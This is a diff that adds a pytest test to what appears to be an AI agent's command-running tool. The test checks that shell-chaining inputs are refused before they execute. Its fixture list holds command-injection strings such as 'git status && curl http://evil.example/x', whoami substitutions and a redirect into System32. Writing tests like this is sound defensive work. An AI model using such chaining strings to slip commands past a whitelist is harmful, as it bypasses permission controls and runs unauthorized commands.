@@ -124,6 +124,33 @@ def test_run_command_whitelisted_runs(workspace):
     assert _last_audit()["outcome"] == "success"
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git status && curl http://evil.example/x",   # chain
+        "git status; whoami",                          # sequence
+        "git status | findstr secret",                 # pipe
+        "git status > C:/Windows/System32/out.txt",    # redirect
+        "git log `whoami`",                            # backtick substitution
+        "git log $(whoami)",                           # POSIX substitution
+        "echo %USERPROFILE%",                          # cmd.exe var expansion
+    ],
+)
+def test_run_command_refuses_shell_chaining(workspace, monkeypatch, command):
+    """The whitelist inspects argv[0], but `_exec` hands the WHOLE string to the
+    shell — so a metacharacter used to smuggle an arbitrary second command past
+    a whitelisted first one ("git" gates in, "curl …" runs). Refused before the
+    confirmation dialog and before any execution."""
+    ran = []
+    monkeypatch.setattr(tools.subprocess, "run",
+                        lambda *a, **k: ran.append(a) or (_ for _ in ()).throw(
+                            AssertionError("command executed")))
+    r = tools.run_command(command=command)
+    assert r["_ui_components"][0]["variant"] == "warning"
+    assert _last_audit()["outcome"] == "refused"
+    assert ran == []
+
+
 # --- dangerous bypass ------------------------------------------------------ #
 
 
